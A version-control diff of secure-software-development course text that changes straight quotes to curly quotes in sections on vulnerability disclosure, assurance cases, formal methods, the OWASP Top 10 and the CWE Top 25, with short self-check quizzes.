-* *"Automation reduces the time to respond to vulnerabilities… 80% of organizations… that use automation say they have the ability to respond to vulnerabilities in a shorter timeframe."* However, this automation depends on a variety of factors, including (in most cases) having a CVE assigned when there is a vulnerability.
+* *“Automation reduces the time to respond to vulnerabilities… 80% of organizations… that use automation say they have the ability to respond to vulnerabilities in a shorter timeframe.”* However, this automation depends on a variety of factors, including (in most cases) having a CVE assigned when there is a vulnerability.
 
 CVSS is widely used, because there is a need for clear prioritization, but CVSS is also widely criticized (for example, [*Broken vulnerabilities severities*](https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/), by Josh Bressers, 2020). A new version of CVSS (beyond version 3), or a replacement for it, may be developed and/or become widely used in the future.
 
@@ -4236,11 +4236,11 @@ Reporting a vulnerability that you have found can be surprisingly complicated. I
 
 There are several different kinds of disclosure models:
 
-1. **Private Disclosure**<br>*"In the private disclosure model, the vulnerability is reported privately to the organisation. The organisation may choose to publish the details of the vulnerabilities, but this is done at the discretion of the organisation, not the researcher, meaning that many vulnerabilities may never be made public. The majority of bug bounty programs require that the researcher follows this model. The main problem with this model is that if the vendor is unresponsive, or decides not to fix the vulnerability, then the details may never be made public. Historically this has led to researchers getting fed up with companies ignoring and trying to hide vulnerabilities, leading them to the full disclosure approach."* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html))
+1. **Private Disclosure**<br>*“In the private disclosure model, the vulnerability is reported privately to the organisation. The organisation may choose to publish the details of the vulnerabilities, but this is done at the discretion of the organisation, not the researcher, meaning that many vulnerabilities may never be made public. The majority of bug bounty programs require that the researcher follows this model. The main problem with this model is that if the vendor is unresponsive, or decides not to fix the vulnerability, then the details may never be made public. Historically this has led to researchers getting fed up with companies ignoring and trying to hide vulnerabilities, leading them to the full disclosure approach.”* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html))
 
-2. **Full Disclosure**<br>*"With the full disclosure approach, the full details of the vulnerability are made public as soon as they are identified. This means that the full details (sometimes including exploit code) are available to attackers, often before a patch is available. The full disclosure approach is primarily used in response to organizations ignoring reported vulnerabilities, in order to put pressure on them to develop and publish a fix. This makes the full disclosure approach very controversial, and it is seen as irresponsible by many people. Generally it should only be considered as a last resort, when all other methods have failed, or when exploit code is already publicly available"* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Another reason to consider full disclosure is if there is reason to believe that the supplier is intentionally malicious; reporting a vulnerability to only a malicious supplier gives the malicious supplier more time to exploit the vulnerability.
+2. **Full Disclosure**<br>*“With the full disclosure approach, the full details of the vulnerability are made public as soon as they are identified. This means that the full details (sometimes including exploit code) are available to attackers, often before a patch is available. The full disclosure approach is primarily used in response to organizations ignoring reported vulnerabilities, in order to put pressure on them to develop and publish a fix. This makes the full disclosure approach very controversial, and it is seen as irresponsible by many people. Generally it should only be considered as a last resort, when all other methods have failed, or when exploit code is already publicly available”* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Another reason to consider full disclosure is if there is reason to believe that the supplier is intentionally malicious; reporting a vulnerability to only a malicious supplier gives the malicious supplier more time to exploit the vulnerability.
 
-3. **Coordinated Disclosure (historically called Responsible Disclosure)**<br>Coordinated disclosure *"attempts to find a reasonable middle ground between these two approaches. … the initial report is made privately, but with the full details being published once a patch has been made available (sometimes with a delay to allow more time for the patches to be installed)."* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Historically, this has been called *responsible disclosure*, but this is a biased term, and its original coiner now recommends calling it coordinated disclosure instead. It is **important** that there is a **time limit** before the vulnerability will be unilaterally disclosed. Without a time limit this is essentially identical to private disclosure, since the supplier may have little incentive to fix the vulnerability.
+3. **Coordinated Disclosure (historically called Responsible Disclosure)**<br>Coordinated disclosure *“attempts to find a reasonable middle ground between these two approaches. … the initial report is made privately, but with the full details being published once a patch has been made available (sometimes with a delay to allow more time for the patches to be installed).”* ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Historically, this has been called *responsible disclosure*, but this is a biased term, and its original coiner now recommends calling it coordinated disclosure instead. It is **important** that there is a **time limit** before the vulnerability will be unilaterally disclosed. Without a time limit this is essentially identical to private disclosure, since the supplier may have little incentive to fix the vulnerability.
 
 4. **Disclosure to Attackers**<br>Some researchers work for organizations who attack others’ systems. Other researchers sell vulnerabilities to such organizations, or to brokers who then sell the vulnerabilities on. Doing this is controversial, especially when they are sold to brokers who do not clearly disclose exactly who is buying the vulnerabilities. The impact of doing this varies, because there is great variety in organizations who pay for vulnerabilities. These organizations include law enforcement in various countries, militaries in various countries, organized crime, and/or terrorist groups. Anyone who provides vulnerabilities to attackers should consider the ethical implications. In particular, you should consider what the attackers are likely to do with these vulnerabilities. Do you have confidence that the attackers will not use the vulnerabilities in contravention of human rights? Will they harm certain people or groups such as ethnic minorities, political dissidents, or journalists? If you disclose vulnerabilities to attackers, then you are supporting how these organizations will use those vulnerabilities to attack others; you should be confident that they will use them for good.
 
@@ -4250,23 +4250,23 @@ Coordinated disclosure time limits (aka *embargo periods*) vary greatly. This ti
 
 * [linux-distros](https://oss-security.openwall.org/wiki/mailing-lists/distros): less than 7 days preferred, up to 14 days allowed, up to 19 days if Thu/Fri report & disclosure on Mon/Tue
 
-* [oCERT](http://ocert.org/): 14 days standard; 7 days if trivial, 30 days if critical/complex, up to 2 months "extremely exceptional"
+* [oCERT](http://ocert.org/): 14 days standard; 7 days if trivial, 30 days if critical/complex, up to 2 months “extremely exceptional”
 
-* [CERT/CC](https://www.cert.org/vulnerability-analysis/vul-disclosure.cfm): 45 days "regardless of the existence… of patches or workarounds… Extenuating circumstances … may result in earlier or later disclosure... We will not distribute exploits" 
+* [CERT/CC](https://www.cert.org/vulnerability-analysis/vul-disclosure.cfm): 45 days “regardless of the existence… of patches or workarounds… Extenuating circumstances … may result in earlier or later disclosure... We will not distribute exploits” 
 
 * [Google Project Zero](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html): 90 days.
 
 #### Further Information
 
-A good source for more information is FIRST’s "[Guidelines and Practices for Multi-Party Vulnerability Coordination and Disclosure](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)". Historically many documents have focused on simple bi-lateral coordination between a security researcher and a software supplier, but today there are often complexities due to the need for multi-party coordination. This FIRST document discusses these more complex situations, and provides guidelines for addressing them.
+A good source for more information is FIRST’s “[Guidelines and Practices for Multi-Party Vulnerability Coordination and Disclosure](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)”. Historically many documents have focused on simple bi-lateral coordination between a security researcher and a software supplier, but today there are often complexities due to the need for multi-party coordination. This FIRST document discusses these more complex situations, and provides guidelines for addressing them.
 
 ## Miscellaneous
 
 ### Assurance Cases
 
-Sadly, you cannot just do one thing and make a system secure. Instead, you need to do a variety of things. Tracking the various techniques you need to do, to ensure that you are really addressing everything you think you should, can become overwhelming… especially if your software gets large or there are expectations of strong security. In addition, sometimes potential stakeholders (such as users) want to understand what you are doing in order to determine if you are doing enough for their purposes. An unstructured list of "*things that were done*" does not really help when a system gets larger; you might do many things, but fail to address something important.
+Sadly, you cannot just do one thing and make a system secure. Instead, you need to do a variety of things. Tracking the various techniques you need to do, to ensure that you are really addressing everything you think you should, can become overwhelming… especially if your software gets large or there are expectations of strong security. In addition, sometimes potential stakeholders (such as users) want to understand what you are doing in order to determine if you are doing enough for their purposes. An unstructured list of “*things that were done*” does not really help when a system gets larger; you might do many things, but fail to address something important.
 
-A practical alternative is creating an *assurance case*. An assurance case *"includes a top-level  claim for a property of a system or product (or set of claims), systematic argumentation regarding this claim, and the evidence and explicit assumptions that underlie this argumentation"* ([ISO/IEC 15026-2:2011](https://www.iso.org/standard/52926.html)). Let’s look at that definition; put another way, an assurance case includes:
+A practical alternative is creating an *assurance case*. An assurance case *“includes a top-level  claim for a property of a system or product (or set of claims), systematic argumentation regarding this claim, and the evidence and explicit assumptions that underlie this argumentation”* ([ISO/IEC 15026-2:2011](https://www.iso.org/standard/52926.html)). Let’s look at that definition; put another way, an assurance case includes:
 
 * Claim(s): Top-level claim(s) for a property of a system or product. That is, something that you want to be true.
 
@@ -4278,7 +4278,7 @@ The point of an assurance case is that it is *systematic*. In other words, you s
 
 An assurance case does not have to be in any particular form. However, they are often documents with figures showing the high-level structure, and text providing the details. That is simply because it is easy to glance at the figures to see how things work together, but the text provides the details to really understand things.
 
-Let’s talk about one way to create an assurance case, based on material from [*A Sample Security Assurance Case Pattern*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) by David A. Wheeler (2018). Let’s say that we have an overall claim: we want to claim that our "system is adequately secure against moderate threats". Let’s argue that we can provide adequate proof of this if our security requirements are identified and met by its functionality, and that security is implemented by system life cycle processes. We can break down the security requirements further into our security requirement triad (confidentiality, integrity, and availability), properly handling access control, and identifying and addressing the assets and threat actors. Here is a figure that shows the top level of an assurance case:
+Let’s talk about one way to create an assurance case, based on material from [*A Sample Security Assurance Case Pattern*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) by David A. Wheeler (2018). Let’s say that we have an overall claim: we want to claim that our “system is adequately secure against moderate threats”. Let’s argue that we can provide adequate proof of this if our security requirements are identified and met by its functionality, and that security is implemented by system life cycle processes. We can break down the security requirements further into our security requirement triad (confidentiality, integrity, and availability), properly handling access control, and identifying and addressing the assets and threat actors. Here is a figure that shows the top level of an assurance case:
 
 ![image alt text](top_assurance_case.png)
 
@@ -4288,7 +4288,7 @@ We could then repeatedly break each item down further. For example, we might div
 
 * For design, we might show that we followed all the Saltzer & Schroeder (S&S) design principles we have already discussed.
 
-* For implementation, we might show that we countered all the "top" vulnerabilities identified by some widely-accepted and relevant list of top vulnerabilities.
+* For implementation, we might show that we countered all the “top” vulnerabilities identified by some widely-accepted and relevant list of top vulnerabilities.
 
 * For verification, we might show that we use a variety of tools to detect vulnerabilities before the software is released. 
 
@@ -4296,7 +4296,7 @@ For a detailed discussion and template for creating an assurance case, see [*A S
 
 When do you end? The usual answer is when the stakeholders agree that it is enough. If they don’t think it is enough, then ask them what would be enough and if they are willing to pay for those changes. If they are not paying you enough, then you don’t need to do it.
 
-What is great about an assurance case is that if someone later wants to know "is this software adequately secure", they can simply review the assurance case. Simply *having* an assurance case provides a lot of confidence, because it shows that someone thought through what the system is supposed to do and has a reasonable argument (with evidence) that the claims are correct.
+What is great about an assurance case is that if someone later wants to know “is this software adequately secure”, they can simply review the assurance case. Simply *having* an assurance case provides a lot of confidence, because it shows that someone thought through what the system is supposed to do and has a reasonable argument (with evidence) that the claims are correct.
 
 ### Quiz 4.2
 
@@ -4328,7 +4328,7 @@ When fielding/deploying:
 
     * Your environment should be configured to provide least privilege and use maximum security settings your system allows.
 
-    * Beware of *"insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information"* (as OWASP notes).
+    * Beware of *“insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information”* (as OWASP notes).
 
     * Harden your environment by maximally enabling security countermeasures and eliminating unused components (so their vulnerabilities cannot be exploited). These components include your operating systems, database systems, virtual machine monitor, virtual machines, container runtime infrastructure, containers, and anything else you use or depend on. There are many documents that discuss how to harden various components; use them!
 
@@ -4354,7 +4354,7 @@ When operating:
 
 * Once a vulnerability or incident is resolved, use root cause analysis to figure out *why it happened* so changes can be made to prevent a similar recurrence.
 
-* Create backups, and store them securely (attackers love to get copies of backups). Test to ensure you can recover from them. Make sure you have offline ("cold") backups to counter ransomware (which breaks in, encrypts your data, and holds it for ransom).
+* Create backups, and store them securely (attackers love to get copies of backups). Test to ensure you can recover from them. Make sure you have offline (“cold”) backups to counter ransomware (which breaks in, encrypts your data, and holds it for ransom).
 
 * When you receive a vulnerability report, process and fix it in a timely manner. Then give the reporter public credit unless the reporter requests otherwise.
 
@@ -4368,13 +4368,13 @@ When disposing, make sure you fully destroy any data you are supposed to destroy
 
 [x] In operations, turn on logging and redirect log recording to a central protected location for monitoring.
 
-[ ] Fix any security issue rapidly, and then just move on to other problems. {{ selected: No, after you fix a security issue (incident), you should also try to find out *why* it happened (a "root cause analysis") so you can fix the underlying cause. Otherwise, there is a good chance that similar problems will keep happening. }}
+[ ] Fix any security issue rapidly, and then just move on to other problems. {{ selected: No, after you fix a security issue (incident), you should also try to find out *why* it happened (a “root cause analysis”) so you can fix the underlying cause. Otherwise, there is a good chance that similar problems will keep happening. }}
 
 ### Formal Methods
 
-Today most software needs to be developed to be "reasonably" or “adequately” secure. This course has focused on techniques to help you do that. However, if it is *extremely critical* that your software meet some criteria - such as some security criteria - there is an additional approach that you should be aware of: *formal methods*.
+Today most software needs to be developed to be “reasonably” or “adequately” secure. This course has focused on techniques to help you do that. However, if it is *extremely critical* that your software meet some criteria - such as some security criteria - there is an additional approach that you should be aware of: *formal methods*.
 
-Formal methods are the use of *"mathematically rigorous techniques and tools for the specification, design and verification of software and hardware systems"*, where *“mathematically rigorous”* means that *“specifications are well-formed statements in a mathematical logic and that the formal verifications [if any] are rigorous deductions in that logic”* ([*What is Formal Methods?*](https://shemesh.larc.nasa.gov/fm/fm-what.html), by Ricky W. Butler). In short, formal methods apply mathematics to software.
+Formal methods are the use of *“mathematically rigorous techniques and tools for the specification, design and verification of software and hardware systems”*, where *“mathematically rigorous”* means that *“specifications are well-formed statements in a mathematical logic and that the formal verifications [if any] are rigorous deductions in that logic”* ([*What is Formal Methods?*](https://shemesh.larc.nasa.gov/fm/fm-what.html), by Ricky W. Butler). In short, formal methods apply mathematics to software.
 
 The big advantages of formal methods are that:
 
@@ -4404,7 +4404,7 @@ Formal methods *are* being used today to develop software, for example:
 
 That said, using formal methods during software development is unusual today. But formal methods may become more common in the future, or you may be asked to develop software where the risk from a vulnerability is extremely high. So in this section we will provide some brief awareness about formal methods.
 
-Before we do that, we need to make one thing clear: Formal methods always require assumptions. If the assumptions are false then their conclusions don’t necessarily hold. For example, you could prove that something is true if the CPU works correctly; a bug in the CPU means that the proof does not hold in that case. That does not make formal methods useless, because they can eliminate many other problems, and you can choose what to assume. But it is important to remember that when someone says "something is proven" that it is really proven given some assumptions… and it is important to understand what those assumptions are.
+Before we do that, we need to make one thing clear: Formal methods always require assumptions. If the assumptions are false then their conclusions don’t necessarily hold. For example, you could prove that something is true if the CPU works correctly; a bug in the CPU means that the proof does not hold in that case. That does not make formal methods useless, because they can eliminate many other problems, and you can choose what to assume. But it is important to remember that when someone says “something is proven” that it is really proven given some assumptions… and it is important to understand what those assumptions are.
 
 #### Formal Methods Levels
 
@@ -4424,15 +4424,15 @@ There are many different ways to apply mathematics, and so there are many differ
 
 A widely-used tool is the idea of boolean expressions. These expressions are true or false, and can include various *propositional connectives* (a proposition is simply something that is either true or false). Here are common propositional connectives. The first three should be very familiar to you, since programming languages copied them from mathematics, but their traditional mathematical notation might be new to you:
 
-1. "x and y" (mathematical “x ∧ y”) is true if both x and y are true, otherwise it is false.
+1. “x and y” (mathematical “x ∧ y”) is true if both x and y are true, otherwise it is false.
 
-2. "x or y" (mathematical “x ∨ y”) is true if either or both x and y are true; if both are false it is false.
+2. “x or y” (mathematical “x ∨ y”) is true if either or both x and y are true; if both are false it is false.
 
-3. "not x" (mathematical “￢x”) is true if x is false, and it is false if x is true.
+3. “not x” (mathematical “￢x”) is true if x is false, and it is false if x is true.
 
-4. "x→y" is true if x is false *or* if y is true, that is, x → y is the same as ((not x) or y). The arrow is often read as “implies”. This operator may be new to you, but this arrow simply represents “if x is true then y is true”. It is formally called *material implication*.
+4. “x→y” is true if x is false *or* if y is true, that is, x → y is the same as ((not x) or y). The arrow is often read as “implies”. This operator may be new to you, but this arrow simply represents “if x is true then y is true”. It is formally called *material implication*.
 
-5. "x&harr;y" is true if x and y have the same value. This is basically “are these values equal” for boolean values. It is sometimes read as “if and only if” (iff).
+5. “x&harr;y” is true if x and y have the same value. This is basically “are these values equal” for boolean values. It is sometimes read as “if and only if” (iff).
 
 You may find it easier to understand the connectives by looking at the following table. This table shows the results of these connectives given the possible input values of x and y (in this table T is true while F is false):
 
@@ -4491,25 +4491,25 @@ Propositional Connectives
 
 Another widely-used mathematical tool is the idea of sets. A set is simply an unordered collection of elements, where elements themselves may be sets. For examples, if you say S = {4, 5, 6}, that just means that set S has 3 elements (specifically 4, 5, and 6). You can then apply various operations to sets, for example:
 
-* The operation "A ∈ B" returns true if and only if the left-hand-side A is a member of the right-hand-side B. So given the previous definition of S, “4 ∈ S” is true (because 4 is a member of S), while “7 ∈ S” is false (because 7 is not a member of S).
+* The operation “A ∈ B” returns true if and only if the left-hand-side A is a member of the right-hand-side B. So given the previous definition of S, “4 ∈ S” is true (because 4 is a member of S), while “7 ∈ S” is false (because 7 is not a member of S).
 
-* The operation "A⊂B" returns true if and only if set A is a subset of set B. Put another way, A⊂B is true if every member of A is also a member of B. So {4,6}⊂S is true, because both 4 and 6 are members of S.
+* The operation “A⊂B” returns true if and only if set A is a subset of set B. Put another way, A⊂B is true if every member of A is also a member of B. So {4,6}⊂S is true, because both 4 and 6 are members of S.
 
 ##### Quantifiers
 
 A widely-used mathematical tool that you may not have seen is the idea of *quantifiers*. These return true or false values based on certain conditions:
 
-* ∀ X *expression* : This is true if and only if the *expression* is always true for all allowed values of X. It essentially "loops" over every value X could be. The ∀ (an upside-down A) is read as “for all”. This lets you easily state that something is always true.
+* ∀ X *expression* : This is true if and only if the *expression* is always true for all allowed values of X. It essentially “loops” over every value X could be. The ∀ (an upside-down A) is read as “for all”. This lets you easily state that something is always true.
 
-* ∃ X *expression* : This is true if and only if there is some allowed value of X where the *expression* is true. The ∃ is read as "there exists". This lets you easily state that something can occur.
+* ∃ X *expression* : This is true if and only if there is some allowed value of X where the *expression* is true. The ∃ is read as “there exists”. This lets you easily state that something can occur.
 
-This means you can use expressions like "∀ X (valid(X) → well_formed(X))" to say “for all values of X, if X is valid then X is well-formed”... or put another way, if X is valid then X is well-formed. Note that this entire expression is true if we are discussing XML data.
+This means you can use expressions like “∀ X (valid(X) → well_formed(X))” to say “for all values of X, if X is valid then X is well-formed”... or put another way, if X is valid then X is well-formed. Note that this entire expression is true if we are discussing XML data.
 
 ##### Mathematical Statements vs. the Real World
 
 Mathematical statements can be used to model the real world, but do not confuse mathematical statements as being the same as the real world!
 
-In particular, you can easily create mathematical statements that are not what you really mean. For example, natural languages sometimes use "and" and “or” in a way different than what we defined above. This is especially a problem for “or”, which in mathematics and computing is true when both sides are true (aka “inclusive or”), but in natural language it is sometimes implied that only one will be true (aka “exclusive or”). For example, in the phrase “we will go to the movies or a play tonight”, the speaker probably does not mean that we could do *both*. Using mathematics can remove many ambiguities like this, but you will have to decide if that expression is what you *mean*. The time-tested way to counter this problem is to have others review your statements and discuss if that is what was intended.
+In particular, you can easily create mathematical statements that are not what you really mean. For example, natural languages sometimes use “and” and “or” in a way different than what we defined above. This is especially a problem for “or”, which in mathematics and computing is true when both sides are true (aka “inclusive or”), but in natural language it is sometimes implied that only one will be true (aka “exclusive or”). For example, in the phrase “we will go to the movies or a play tonight”, the speaker probably does not mean that we could do *both*. Using mathematics can remove many ambiguities like this, but you will have to decide if that expression is what you *mean*. The time-tested way to counter this problem is to have others review your statements and discuss if that is what was intended.
 
 #### Formal Methods Tools
 
@@ -4527,9 +4527,9 @@ Some tools are also designed to verify that claims are mathematically true. Majo
 
 * *Satisfiability (SAT) solvers / SAT modulo theories (SMT)*<br>These take a bunch of equations with variables, and try to find a set of values for those variables that makes all equations true. SAT solvers only handle boolean variables and boolean equations, while SMT solvers can handle other values. Some package managers internally use a SAT solver. Widely-used OSS SMT solvers include Z3, CVC4, and Alt-Ergo-Free.
 
-* *Model-checkers*<br>These take a model and "exhaustively" show it is true in all cases, using many optimization tricks to make that practical. A widely-used OSS generic model checker is Spin (which supports a language called ProMeLa). There are also many model-checking tools specifically designed to analyze programs. For example, CBMC is an OSS bounded model checker for C and C++ programs that can verify memory safety, check for ex­cep­tions, check for various variants of undefined behavior, and supports user-specified as­ser­tions.
+* *Model-checkers*<br>These take a model and “exhaustively” show it is true in all cases, using many optimization tricks to make that practical. A widely-used OSS generic model checker is Spin (which supports a language called ProMeLa). There are also many model-checking tools specifically designed to analyze programs. For example, CBMC is an OSS bounded model checker for C and C++ programs that can verify memory safety, check for ex­cep­tions, check for various variants of undefined behavior, and supports user-specified as­ser­tions.
 
-* *Abstract interpretation / symbolic execution (for programs)*<br>These "execute" programs using relevant simplifications (abstract interpretation) or symbols (symbolic execution).
+* *Abstract interpretation / symbolic execution (for programs)*<br>These “execute” programs using relevant simplifications (abstract interpretation) or symbols (symbolic execution).
 
 There are some systems that can combine these tools. For example:
 
@@ -4545,7 +4545,7 @@ Today formal methods are only used in special circumstances, but they might beco
 
 \>\>Select the true statement(s):<<
 
-[!x] The expression "∀ X foo" is true if *foo* is true no matter what the value of X is.
+[!x] The expression “∀ X foo” is true if *foo* is true no matter what the value of X is.
 
 [ ] Formal methods eliminate assumptions. {{ selected: Not at all. Any formal method has to start with some assumptions. }}
 
@@ -4559,13 +4559,13 @@ Today formal methods are only used in special circumstances, but they might beco
 
 ### OWASP Top 10
 
-We noted earlier that there are two widely-used lists of "top" vulnerabilities, the OWASP Top 10 Web Application Security Risks and the CWE Top 25. They identify what they perceive as the “top” items in terms of being especially common and especially dangerous.
+We noted earlier that there are two widely-used lists of “top” vulnerabilities, the OWASP Top 10 Web Application Security Risks and the CWE Top 25. They identify what they perceive as the “top” items in terms of being especially common and especially dangerous.
 
 Their different scopes result in many differences. For example, the CWE Top 25 lists buffer overflows, while the OWASP Top 10 Web Application Security Risks does not, because buffer overflows are a common serious problem in some domains (such as embedded systems) but they are not common in web applications.
 
 Here is the [OWASP](https://owasp.org/www-project-top-ten/) [*Top 10 Web Application Security Risks*](https://owasp.org/www-project-top-ten/) (2017 edition); please read this list to make sure you understand each one:
 
-1. *"Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.*
+1. *“Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.*
 
 2. *Broken Authentication. Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.*
 
@@ -4583,7 +4583,7 @@ Here is the [OWASP](https://owasp.org/www-project-top-ten/) [*Top 10 Web Applica
 
 9. *Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.*
 
-10. *Insufficient Logging & Monitoring. Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring."*
+10. *Insufficient Logging & Monitoring. Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.”*
 
 In this course we have covered all of the 2017 OWASP Top 10 and included cross-references when we did.
 
@@ -4591,11 +4591,11 @@ In this course we have covered all of the 2017 OWASP Top 10 and included cross-r
 
 \>\>Select the true statement(s):<<
 
-[!x] The #1 biggest risk in the OWASP "Top 10 Web Application Security Risks" are injection flaws, including SQL injection and OS command injection.
+[!x] The #1 biggest risk in the OWASP “Top 10 Web Application Security Risks” are injection flaws, including SQL injection and OS command injection.
 
-[x] Cross-site scripting (XSS) is in the OWASP "Top 10 Web Application Security Risks".
+[x] Cross-site scripting (XSS) is in the OWASP “Top 10 Web Application Security Risks”.
 
-[ ] Buffer overflows are in the OWASP "Top 10 Web Application Security Risks". {{ selected: No, and it is understandable if you missed this. Buffer overflows are very common in embedded systems, because they are widely implemented in C and C++ which provide little protection against buffer overflows. Most web applications are written in other programming languages that protect against buffer overflows, and thus they have relatively rare in web applications. }}
+[ ] Buffer overflows are in the OWASP “Top 10 Web Application Security Risks”. {{ selected: No, and it is understandable if you missed this. Buffer overflows are very common in embedded systems, because they are widely implemented in C and C++ which provide little protection against buffer overflows. Most web applications are written in other programming languages that protect against buffer overflows, and thus they have relatively rare in web applications. }}
 
 ### CWE Top 25
 
@@ -4619,7 +4619,7 @@ No system is perfect. A complication is that the CWEs identified here are at var
   <tr>
     <td>[2]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79</a></td>
-    <td>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</td>
+    <td>Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</td>
   </tr>
   <tr>
     <td>[3]</td>
@@ -4639,7 +4639,7 @@ No system is perfect. A complication is that the CWEs identified here are at var
   <tr>
     <td>[6]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a></td>
-    <td>Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</td>
+    <td>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</td>
   </tr>
   <tr>
     <td>[7]</td>
@@ -4659,12 +4659,12 @@ No system is perfect. A complication is that the CWEs identified here are at var
   <tr>
     <td>[10]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22</a></td>
-    <td>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</td>
+    <td>Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</td>
   </tr>
   <tr>
     <td>[11]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78</a></td>
-    <td>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</td>
+    <td>Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</td>
   </tr>
   <tr>
     <td>[12]</td>
@@ -4699,7 +4699,7 @@ No system is perfect. A complication is that the CWEs identified here are at var
   <tr>
     <td>[18]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94</a></td>
-    <td>Improper Control of Generation of Code ('Code Injection')</td>
+    <td>Improper Control of Generation of Code (‘Code Injection’)</td>
   </tr>
   <tr>
     <td>[19]</td>
@@ -4754,7 +4754,7 @@ Developers that complete mitigation and risk decision-making on the 2019 CWE Top
   <tr>
     <td>[26]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/835.html">CWE-835</a></td>
-    <td>Loop with Unreachable Exit Condition ('Infinite Loop')</td>
+    <td>Loop with Unreachable Exit Condition (‘Infinite Loop’)</td>
   </tr>
   <tr>
     <td>[27]</td>
@@ -4769,7 +4769,7 @@ Developers that complete mitigation and risk decision-making on the 2019 CWE Top
   <tr>
     <td>[29]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/362.html">CWE-362</a></td>
-    <td>Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')</td>
+    <td>Concurrent Execution using Shared Resource with Improper Synchronization (‘Race Condition’)</td>
   </tr>
   <tr>
     <td>[30]</td>
@@ -4784,7 +4784,7 @@ Developers that complete mitigation and risk decision-making on the 2019 CWE Top
   <tr>
     <td>[32]</td>
     <td><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601</a></td>
-    <td>URL Redirection to Untrusted Site ('Open Redirect')</td>
+    <td>URL Redirection to Untrusted Site (‘Open Redirect’)</td>
   </tr>
   <tr>
     <td>[33]</td>
@@ -4829,7 +4829,7 @@ Developers that complete mitigation and risk decision-making on the 2019 CWE Top
 </table>
 
 
-You will be glad to know that this set of courses has, at least briefly, discussed each one of these kinds of vulnerabilities, even the ones "on the cusp".
+You will be glad to know that this set of courses has, at least briefly, discussed each one of these kinds of vulnerabilities, even the ones “on the cusp”.
 
 ### Quiz 4.6
 
@@ -4839,7 +4839,7 @@ You will be glad to know that this set of courses has, at least briefly, discuss
 
 [x]  The 2019 CWE Top 25 Most Dangerous Software Errors list is a combination of all kinds of software.
 
-[ ] The CWEs listed in the 2019 CWE Top 25 Most Dangerous Software Errors do not overlap each other. {{ selected: No, there are CWEs that overlap. For example, #1 CWE-119 ("Improper Restriction of Operations within the Bounds of a Memory Buffer") is a superset of both #5 CWE-125 (“Out-of-bounds read”) and #12 CWE-787 (“Out-of-bounds Write”). }}
+[ ] The CWEs listed in the 2019 CWE Top 25 Most Dangerous Software Errors do not overlap each other. {{ selected: No, there are CWEs that overlap. For example, #1 CWE-119 (“Improper Restriction of Operations within the Bounds of a Memory Buffer”) is a superset of both #5 CWE-125 (“Out-of-bounds read”) and #12 CWE-787 (“Out-of-bounds Write”). }}
 
 ## Concluding Notes
 
@@ -4873,7 +4873,7 @@ Attacker: A person who attacks computer systems.
 
 Hardening a system: Modifying a system so that defects are less likely to become security vulnerabilities. 
 
-Hacker: "a person who delights in having an intimate understanding of the internal workings of a system, computers and computer networks in particular." ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983))
+Hacker: “a person who delights in having an intimate understanding of the internal workings of a system, computers and computer networks in particular.” ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983))
 
 # Further Reading
